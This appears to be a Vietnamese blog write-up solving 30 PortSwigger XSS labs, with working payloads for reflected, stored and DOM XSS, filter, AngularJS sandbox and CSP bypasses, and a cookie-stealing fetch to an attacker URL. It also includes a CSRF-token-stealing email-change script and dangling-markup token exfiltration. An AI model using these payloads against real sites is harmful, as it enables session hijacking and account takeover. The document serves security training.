---
layout: post
title:  "XSS"
date:   2025-07-25 12:00:00 +0700
tags: PortSwigger
categories: jekyll update
---

# XSS 

## LAB01 - Reflected XSS 

Lab này chỉ cần dùng `alert` để nó cảnh báo.

![image](https://hackmd.io/_uploads/SkrdBi3Ixx.png)

## LAB02 - Stored XSS 

Mình tiêm vào trong phần form feedback.

![image](https://hackmd.io/_uploads/SJlZ3s2Ilg.png)

Khi mà vào xem post thì nó sẽ popup. 

## LAB03 - DOM XSS trong source `location.search` dùng sink `document.write`

Lab này có chức năng `search` thì dùng `location.search` và khi tìm kiếm thì nó sẽ gọi tới sink `document.write`. Từ đó, mình có thể viết thêm để chèn payload. 

![image](https://hackmd.io/_uploads/Hy5SRsnUgx.png)

Cho nên mình truyền payload sau: `"><script>alert(origin)</script>`

![image](https://hackmd.io/_uploads/SJB9RinIeg.png)
 
## LAB04 - DOM XSS trong source `location.search` dùng sink `innerHTML`

Lab này liên quan đến sink `innerHTML` thì chức năng của `innerHTML` là thực hiện các tag là HTML. 

Cho nên mình truyền payload như sau: `<img src=x onerror=alert(origin)>`

![image](https://hackmd.io/_uploads/Hy-jZ23Ulg.png)

## LAB05 -  DOM XSS trong thuộc tính href của thẻ liên kết (anchor) sử dụng jQuery, với dữ liệu đầu vào lấy từ location.search

Lab này sử dụng thẻ a để link tới 1 đường dẫn được lấy từ `returnPath`.

![image](https://hackmd.io/_uploads/BJA78nh8gg.png)

Cho nên mình truyền payload như sau: `javascript:alert(origin)`. 

## LAB06 - DOM XSS trong jQuery tại điểm gán selector (sink), sử dụng sự kiện thay đổi hash (hashchange).

Sau khi đọc source thì có một đoạn script như sau: 

![image](https://hackmd.io/_uploads/B1VRaa3Iex.png)

Mục tiêu của đoạn script này là lấy tên tiêu đề của blog sau dấu `#`, sau đó tìm kiếm các thẻ `h2` xem có trùng tên trong `blog-list` ko nếu có thì cuộn tới chỗ bài blog đó. 

Như vậy thực hiện như sau trên server exploit để gửi tới nạn nhân. 
`<iframe src="https://0a98007203c304388017033800aa0048.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

Mình gửi 1 thẻ `iframe` chứa 1 link web và sau link đó là `#`, và thẻ này được xây dựng từ `src` và nối đuôi thêm 1 thẻ `img` có chứa payload.

## LAB07 - Reflected XSS 

Lab này mình bị encode HTML ở các dấu `<` và `>`. Nên khi mình thử payload `<script>alert(origin)</script>` thì nó bị encoded. 

![image](https://hackmd.io/_uploads/rJFpfA2Lxl.png)

Và payload được lưu vào trong biến `value` => nhưng nó ko filter dấu `"` nên mình truyền payload `"onmouseover="alert(origin)`

![image](https://hackmd.io/_uploads/Hy6P7A3Lgx.png)

## LAB08 - Stored XSS 

Lab này xảy ra lỗi nằm ở phần Comment. Sau khi nhập hết các trường thì ở phần nhập tên website sẽ được đưa vào trong thẻ `a` để link tới website. 

![image](https://hackmd.io/_uploads/BkhjSAnUle.png)

Như vậy mình truyền payload như sau: `javascript:alert(origin)`

![image](https://hackmd.io/_uploads/Byf1L038le.png)

## LAB09 - Reflected XSS 

Lab này tương tự như lab đã encode `<>` và `"` 

![image](https://hackmd.io/_uploads/SJzPwCh8ll.png)

Cho nên mình truyền payload `'; alert(origin);//`, lúc đó searchTerm sẽ là `var searchTerm = ''; alert(origin);//'`

## LAB10 - DOM XSS 

Lab lỗi XSS nằm trong chức năng check stock, sau khi kiểm tra source thì có đoạn Script sau. 

![image](https://hackmd.io/_uploads/BkUE2R3Lxg.png)

Có tham số `storeId` được viết vào trong `document.write('<select name="storeId"')` 

Nên mình truyền payload sau: `<script>alert(origin)</script>`

## LAB11 - DOM XSS trong Angular JS với dấu ngoặc nhọn `<>` và dấu ngoặc kép `""` bị encoded HTML 

Lab này xảy ra lỗi nằm trong thư viện AngularJS. AngularJS là một thư viện JavaScript phổ biến, dùng để quét nội dung của các nút HTML chứa thuộc tính ng-app (còn được gọi là chỉ thị AngularJS)

![image](https://hackmd.io/_uploads/SywEJyR8gg.png)

Và khi mình nhập dấu `<>` và `""` thì sẽ bị encoded. Trong AngularJS nhận `{{}}` để thực hiện câu lệnh. Nên mình truyền payload `{{1+1}}`

![image](https://hackmd.io/_uploads/S1KGkJ0Lee.png)

Cho nên mình truyền payload `{{constructor.constructor("alert(origin)")()}}` gọi tới hàm khởi tạo để có thể thực hiện payload. 

## LAB12 - Reflected DOM XSS 

Trong lab này có chức năng search, khi dùng thì nó gọi tới endpoint `/resource/js/searchResult.js` chứa toàn bộ script xử lý. 

![image](https://hackmd.io/_uploads/HJONn1CIxl.png)

Thì khi search xong nó sẽ trả về theo endpoint `search-resutl?search=` và kết quả dựa theo json. 

![image](https://hackmd.io/_uploads/rknChk0Ueg.png)

Khi đó mình dựa vào endpoint `/resource/js/searchResult.js` mà truyền payload => `\"-alert(origin)}\\`

![image](https://hackmd.io/_uploads/ByVD6JRLel.png)

## LAB13 - Stored DOM XSS 

Lab này nằm trong phần comment, khi mình truy cập view post sẽ gọi tới endpoint `/resources/js/loadCommentsWithVulnerableEscapeHtml.js` 

![image](https://hackmd.io/_uploads/Bk437l08ex.png)

Trong phần body của comment có xử lý escape HTML. 

![image](https://hackmd.io/_uploads/HkLqXlRUel.png)

Khi mình nhập `<script>test</script>` thì nó sẽ in ra `<script>test` => nghĩa là nó xử lý tag đầu còn tag sau không xử lý encoded mà nó hiểu là đóng tag nên ko in ra. 

Và nó xử lý phần comment là innerHTML.

![image](https://hackmd.io/_uploads/ByFFQeRUxl.png)

Nếu mình truyền payload `<><img src=x onerror=alert(origin)>` thì sẽ bypass thành công. 

## LAB14 - Reflected XSS và WAF chặn các tag phổ biến 

Lab này xảy ra Reflected XSS ở chức năng tìm kiếm. Nhưng khi truyền `<h1>test</h1>` thì sẽ bị WAF chặn. 

![image](https://hackmd.io/_uploads/H1hNPxAIgg.png)

Cho nên là mình cần biết tag nào bị chặn để có thể bypass, nên mình cần brute force nó dựa theo cheatsheet sau: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 

![image](https://hackmd.io/_uploads/rJAWix0Lgg.png)

Sau khi tìm các tag được phép, thì cần tìm ra thuộc tính nào cho phép sử dụng. Và dùng thẻ `<body>` có chứa thuộc tính để brute-force. 

![image](https://hackmd.io/_uploads/rkogRHCLee.png)

Kết quả, sau khi tìm ra thuộc tính không bị chặn. 

![image](https://hackmd.io/_uploads/HkVZfIA8ge.png)

Mình thấy kha khá thuộc tính ko bị chọn => nên bóc đại 1 cái để thử. 

![image](https://hackmd.io/_uploads/HJQPrUCIxx.png)

Sau khi gửi tới victim thì sẽ solve lab. 

## LAB15 - Reflected XSS bị block tất cả các tag ngoại trừ tag custom ones 

Khi mà tất cả các tag bị chặn, nhưng mình được dùng `custom tag` nghĩa là tag do mình tự đặt. Và thuộc tính `onfocus` ko bị block => thuộc tính sẽ thực thi code js khi được click chuột hoặc dùng tab trên bàn phím. 

Nên mình truyền payload sau: `<my-tag onfocus='alert(document.cookie)' id='x' tabindex='1'>`. Ý nghĩa là payload khi đó khi click vào chỗ kết quả search trả về sẽ popup lên. 

![image](https://hackmd.io/_uploads/rkJAXP0Uex.png)

Như vậy nếu gửi tới chó client thì nó sẽ ko popup lên vì client nhìu khi ko click thì sao. 

Cho nên mình phải thêm `#x` vào phía sau thì lúc đó trình duyệt tìm thấy phần tử `x` nếu đúng thì nó sẽ tự popup. 

Và khi gửi cho client thì mình dùng `location` để nó chuyển hướng. 

```json= 
<script>
    location='https://0a83003e04be6d3980b253bf00a5003f.web-security-academy.net/?search=%3Cmy-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27x%27+tabindex%3D%271%27%3E#x'
</script>
```

## LAB16 - Reflected XSS với 1 vài SVG markup được cho phép 

Lab này thì thẻ `svg` và một số thẻ khác được cho phép. 

![image](https://hackmd.io/_uploads/ByFibQkwlx.png)

Thì `<svg>` (Scalable Vector Graphics) là một ngôn ngữ đồ họa dạng vector dùng để vẽ hình học, biểu đồ, biểu tượng, icon, hoạt cảnh (animation) v.v... trực tiếp trong HTML.

Cho nên mình hoàn toàn có thể truyền `<svg><animatetransform></svg>`

Và thuộc tính sau khi brute-force ko bị chặn là `onbegin`

![image](https://hackmd.io/_uploads/SkMkm7yDex.png)

Nên mình có thể truyền payload sau => `<svg><animatetransform onbegin='alert(origin)'></svg>` 

## LAB17 - XSS Reflected trong tag canonical link

cononical link là chỉ định một URL "chuẩn" cho một trang web. Và accesskey là một thuộc tính HTML cho phép mình gán phím tắt để truy cập nhanh một phần tử HTML, thường là button, link, input,... 

![image](https://hackmd.io/_uploads/SyCOcEJvex.png)

Như vậy, mình cần chèn để có ngắt chuỗi và thêm payload. 

`<link rel="canonical" href='https://0abd00d903210bcf8037bc0000dc0055.web-security-academy.net/?hello'/>` 

Nếu mình truyền payload => `?'onclick='alert(origin)` lúc đó nó sẽ thành: 

`<link rel="canonical" href='https://0abd00d903210bcf8037bc0000dc0055.web-security-academy.net/?'onclick='alert(origin)'>`

![image](https://hackmd.io/_uploads/ry5g0E1vxx.png)

Sau đó, mình thêm `accesskey` vào trong payload => `?'accesskey='x' onclick='alert(origin)`

![image](https://hackmd.io/_uploads/rJj3RVyPge.png)

XSS sẽ được trigger khi nạn nhân nhấn vào phím tắt

## LAB18 - Reflected XSS vào trong chuỗi JavaScript escaped dấu nháy đơn `'` và `\`

Lab này có Reflected XSS nằm ở chức năng search. Sau khi search thử và đọc source thì có một đoạn script như sau: 

![image](https://hackmd.io/_uploads/H1ELxrkDgg.png)

Thì đúng là mình hoàn toạn bị chặn `'` và `\`

![image](https://hackmd.io/_uploads/H15FeSyDxg.png)

Nhưng mình vẫn có thể chèn `</script>` vào trước 1 lệnh `<script>alert(origin)</script>`. Do nó ko filter nên khi đó trình duyệt sẽ đóng lại khi gặp `</script>` tag đóng và sau đó thực hiện lệnh `alert` phía sau. 

## LAB19 - Reflected XSS vào trong chuỗi Javascript với dấu `<>` và `"` bị encoded HTML và thoát escape dấu `'`

Trong phần search của lab có bị dính Reflected XSS và sau đó kiểm tra source thì có đoạn script như sau: 

![image](https://hackmd.io/_uploads/rJQwrIJwlg.png)

Sau đó, mình thử payload đóng chuỗi `';alert(origin)//`, nhưng mình hoàn toàn bị chặn. 

![image](https://hackmd.io/_uploads/H1oewUyweg.png)

Nếu mình hoàn toàn làm cho `\'` là chuỗi thì hoàn thành được payload. Cho nên mình truyền payload => `\';alert(origin)//` 

![image](https://hackmd.io/_uploads/BJnaD8Jwxl.png)

## LAB20 - Stored XSS vào trong sự kiện `onclick` với dấu `<>` và `"` bị encoded HTML và thoát escape dấu `'` và `/`

Lab này xảy ra lỗi XSS nằm ở phần comment. 

![image](https://hackmd.io/_uploads/Hk_Zxwywxx.png)

Nó sẽ gọi đến `onclick` gọi đến link do người comment cung cấp thông qua hàm tracker. Nhưng nếu mình có thể tìm cách đóng chuỗi bằng `'` thì hoàn toàn ổn nhưng mình bị encoded. 

Cho nên mình sẽ truyền payload là `https://test.test?&apos;-alert(1)-&apos;` sau khi đó trình duyệt sẽ nghĩ dấu `'` bị encoded sẽ là 1 phần của code JS nên sẽ decode. 

Lúc đó, nó sẽ thành `<a id="author" href="https://test.test?'-alert(1)-'" onclick="var tracker={track(){}};
tracker.track('https://blah.com?'-alert(1)-'');">test</a>`

## LAB21 - Reflected XSS thông qua template literal với các ký tự đặc biệt đã được mã hóa Unicode

Bài lab này nằm trong chức năng search nhưng nó bị filter `'`, `"`, `<>`, `\` và dấu backstick nữa. Và bài này thì dùng template literal nên mình nên xem các syntax của nó. 

![image](https://hackmd.io/_uploads/HyiLsPJPge.png)

Vì vậy mình truyền payload `${}` để có thể trigger => `${alert(origin)}`

## LAB22 - Khai thác XSS để lấy cắp cookie 

Lab này xảy ra Stored XSS trong phần comment. Để lấy cắp được cookie thì chỉ cần fetch tới 1 domain do attacker dựng sẵn là được. 

Dùng payload như sau => `<script>fetch("http://url/?c="+document.cookie)</script>`

![image](https://hackmd.io/_uploads/HyaNc_kDlx.png)

## LAB23 - Khai thác XSS để lấy cắp password 

Lab này dính XSS ở chức năng comment. Do nó hiển thị trong phần comment thông qua thẻ `<p>` nên khi mình nhập 1 thẻ `<input>` thì nó vẫn render. 

![image](https://hackmd.io/_uploads/r1vq6d1wel.png)

Cho nên để lấy được password thì chỉ cần giả mạo ô nhập sau đó gửi về qua domain do attacker đã dựng sẵn. 

![image](https://hackmd.io/_uploads/HkgbJFkPle.png)

Sau khi người dùng bị lừa nhấp và điền thông tin thì nhấp ra ngoài thì sự kiện onchange sẽ trigger. 

![image](https://hackmd.io/_uploads/rJWDgY1Dgl.png)

## LAB24 - Khai thác XSS dẫn dến CSRF 

Lab này dính XSS ở phần comment, mình sẽ khai thác XSS để người dùng đến thì gửi đến endpoint thay đổi email.
Sau khi login thì sẽ nhận được 1 csrf. 

![image](https://hackmd.io/_uploads/ryGtEY1Deg.png)
 
Thử kiểm chứng với payload đơn giản `<script>alert(origin)</script>` 

![image](https://hackmd.io/_uploads/HyA04tywel.png)

Sau đó thực hiện payload sau: 
```
<script>
	var x = new XMLHttpRequest;
	x.open('GET', '/my-account');
	x.onload = function () {
		var csrfToken = this.responseText.match(/name="csrf" value="(.*)">/)[1];
		fetch('/my-account/change-email', {
		method: 'POST',
		mode: 'no-cors',
		headers:{
		'Content-Type': 'application/x-www-form-urlencoded'
		},    
		body: new URLSearchParams({
			'email': 'test@gmail.com',
			'csrf': csrfToken
		})
	});
	}
	x.send();
</script>
```

## LAB25 - Reflected XSS trong AngularJS bằng cách thoát khỏi sandbox mà không sử dụng chuỗi

Trong sandbox của AngularJS thì luôn chặn các kí tự nguy hiểm như `{{}}`, `ng-bind`,... không cho phép gọi các hàm cục bộ nguy hiểm, đồng thời là các từ như `alert`, `document.cookie`,... 

Khi mình nhập `<script>alert(origin)</script>` => đều bị encoded để tránh nguy hiểm. 

![image](https://hackmd.io/_uploads/B12LVdlDgx.png)

Nhưng mình có thể dùng payload sau để có thể né tránh dùng chuỗi => `toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`

Ở đoạn đầu gọi tới `toString().constructor.prototype.charAt=[].join;` => sẽ thực hiện việc ghi đè lên hàm charAt trong AngularJS sandbox.
Đoạn sau là `[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1`, nó sort 1 mảng có 1 phần tử là 1 `[1]` dựa theo key là `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` để né tránh chuỗi nên mình dùng ascii => lúc đó sẽ trigger lên là `x=alert(1)`

## LAB26 - Reflected XSS với thoát AngularJS sandbox và CSP 

CSP là một cơ chế bảo mật phía trình duyệt giúp ngăn chặn tấn công XSS. 

Lab này liên quan đến việc sử dụng `ng-focus`, mục tiêu của `ng-focus` là chạy 1 biểu thức hoặc 1 hàm mỗi khi phần tử DOM được focus. 

Để có thể trigger lên được thì dùng payload sau: 
`<input id='x' ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)>#x`
Đoạn `$event.composedPath()` là để ko bị chặn và nó sẽ trả về một mảng, sau đó `orderBy` sẽ sắp xếp theo một key nhưng nó là câu lệnh `alert` thì nó sẽ trigger. 

## LAB27 - Reflected XSS khi các event handler (như onclick) và thuộc tính href bị chặn. 

Ở lab này, thuộc tính của thẻ `a` và các event liên kết đã bị chặn. 
Cho nên mình truyền payload sau: `<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a></svg>`

## LAB28 - Reflected XSS trong URL javascript nhưng một số ký tự bị chặn.

Sau khi mình truy cập vào 1 post và kiểm tra source thì thấy như sau: 

![image](https://hackmd.io/_uploads/r1HFIbZPlx.png)

Sau đó mình thử nhập 1 payload cơ bản vào `<script>alert(1337)</script>`

![image](https://hackmd.io/_uploads/BkPeWMWDxe.png)

Cho nên mình tìm cách đóng chuỗi bằng `'` nhưng encoded thành `&%27;` 

![image](https://hackmd.io/_uploads/rJHvbz-Ple.png)

Có vẻ là nó đóng được chuỗi nhưng đã bị filter mất `()` nên mình truyền payload như sau: 
`&%27}x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`
Lúc đó payload nó sẽ thành: `javascript:fetch('/analytics', {method:'post',body:'/post/postId=2'}x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_=> window.location = '/')` 

## LAB29 - Reflected XSS được bảo vệ bởi CSP rất nghiêm ngặt, kết hợp với dangling markup attack 

Lab này yêu cầu thực hiện reflected xss và bypass được CSP và trích CSRF token của nạn nhân. Sau đó, đổi email nạn nhân thành hacker@evil-user.net.

![image](https://hackmd.io/_uploads/rJbA_MZDge.png)

Ở phần `value=""` sẽ nhận dữ liệu từ tham số `email` 

![image](https://hackmd.io/_uploads/ByJHYGZvex.png)

Nên mình sẽ truyền payload đóng chuỗi như sau: `"></form><form class="login-form" name="change-email-form" action="https://EXPLOIT-SERVER-ID.exploit-server.net/log" method="GET"><button class="button" type="submit">Click me</button>`

Từ đây, mình gửi nó đến nạn nhân như sau: 

![image](https://hackmd.io/_uploads/B1WS2z-Peg.png)

Đầu tiên là mình stored payload này lại. 

Và sau đó, mình view exploit 

![image](https://hackmd.io/_uploads/r1SwhG-Dgx.png)

Cuối cùng, gửi cho nạn nhân. Thì sau đó, mình nhận được 1 phản hồi có chứa csrf token 

![image](https://hackmd.io/_uploads/By8dTG-Dge.png)

Để mà sửa lại được email thì thực hiện lại payload như sau: 

![image](https://hackmd.io/_uploads/By1JRzWvex.png)

## LAB30 - Reflected XSS được bảo vệ bằng CSP và bypass CSP 

Ở lab này khi mình tìm kiếm 1 với payload XSS `<script>alert(origin)</script>` thì sẽ nhận được csp-report như sau: 

![image](https://hackmd.io/_uploads/SycFJQZDll.png)

Thì giải thích cho cái header này như sau: 

![image](https://hackmd.io/_uploads/Bk3SlQbPgl.png)

Vì trong header có report uri là `/csp-report?token=` cho nên mình vẫn có thể đóng lại và thêm chính sách cho payload mình hoạt động.

`/?token=;script-src-elem 'unsafe-inline'&search=<script>alert(document.domain)</script>`

![image](https://hackmd.io/_uploads/By6Q-7ZDxl.png)

![image](https://hackmd.io/_uploads/HJhUz7bPlx.png)
